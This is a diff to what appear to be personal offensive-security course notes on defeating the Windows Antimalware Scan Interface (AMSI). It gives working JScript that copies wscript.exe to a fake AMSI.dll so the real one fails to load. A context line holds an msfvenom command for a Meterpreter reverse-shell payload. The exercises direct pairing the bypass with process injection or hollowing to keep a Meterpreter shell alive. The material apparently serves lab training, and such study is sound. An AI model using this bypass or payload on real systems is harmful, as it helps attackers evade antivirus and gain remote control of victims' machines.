@@ -557,3 +557,42 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.210 LPORT=9001 
 
 ```
 - upload and run
+
+#### TODO: Notes to attempt build Generic Jscript AMSI Bypass
+
+- Win11 CLSID for jscript.dll is different than in Win10 `Computer\HKEY_CLASSES_ROOT\CLSID\{cc5bbec3-db4a-4bed-828d-08d78ee3e1ed}\InprocServer32`
+- Newer Win10 builds don't query the AMSI bypass registry setting
+	- amsi.dll is called for analysis
+
+
+#### Preventing AMSI from loading or load another version
+
+- Using Windbg can show that amsi.dll is loaded from System32 using LoadLibraryExW where `R8` is set to `0x800` which is the enum `LOAD_LIBRARY_SEARCH_SYSTEM32`.
+- If the system sees another amsi.dll is loaded, the real amsi.dll will fail to load
+- Copy wscript.exe to amsi.dll outside of C:\\Windows\\System32 and then use the WScript `Exec` method which is a wrapper for `CreateProcess` Win32 API. `CreateProcess` ignores the file extension and parses the file header to determine if the object called can run.
+
+##### Example code:
+```vb
+var filesys= new ActiveXObject("Scripting.FileSystemObject");
+var sh = new ActiveXObject('WScript.Shell');
+try
+{
+	if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0)
+	{
+		throw new Error(1, '');
+	}
+}
+catch(e)
+{
+	filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\Tasks\\AMSI.dll");
+	sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName);
+	WScript.Quit(1);
+}
+```
+
+- *However*, Windows Defender still flags the code and will terminate execution unless one migrates the process or uses a payload that performs process injection or hollowing
+
+### Exercises 7.6.3
+
+1. Recreate the AMSI bypass by renaming wscript.exe to "amsi.dll" and executing it.
+2. Instead of a regular shellcode runner, implement this bypass with a process injection or hollowing technique and obtain a Meterpreter shell that stays alive after the detection.
